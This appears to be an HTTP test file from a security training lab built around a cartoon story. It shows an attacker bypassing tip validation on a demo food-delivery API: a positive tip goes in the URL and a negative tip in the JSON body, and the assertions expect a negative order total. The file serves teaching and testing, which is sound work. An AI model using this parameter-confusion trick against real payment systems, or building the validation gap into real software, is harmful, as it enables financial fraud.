# @import ../common/setup.http
@base = {{base_host}}/v104

### Sandy added a new feature: now you can tip your courier!
# Plankton wonders what will happen if he adds a negative amount.

### Plankton prepares a cart
# @name cart
POST {{base}}/cart
Authorization: {{plankton_auth}}

POST {{base}}/cart/{{cart.cart_id}}/items
Authorization: {{plankton_auth}}
Content-Type: application/json

{ "item_id": "2" }

### Plankton tries to put a negative tip in the JSON body# @name exploit
# It will not work
POST {{base}}/cart/{{cart.cart_id}}/checkout
Authorization: {{plankton_auth}}
Content-Type: application/json

{
  "tip": -50,
  "delivery_address": "Chum Bucket"
}

?? status == 400

### Plankton tries to add a negative tip in the form body
# It will not work (again)
POST {{base}}/cart/{{cart.cart_id}}/checkout
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

tip=-50&delivery_address=124 Conch Street

?? status == 400

# --- Exploit: Plankton can bypass tip validation ---

### Plankton puts a positive tip in the URL but a negative tip in the request body
# @name exploit
POST {{base}}/cart/{{cart.cart_id}}/checkout?tip=20
Authorization: {{plankton_auth}}
Content-Type: application/json

{
  "tip": -50,
  "delivery_address": "Chum Bucket"
}

?? status == 201
?? js response.parsedBody.tip == -50
?? js response.parsedBody.total == -32.50
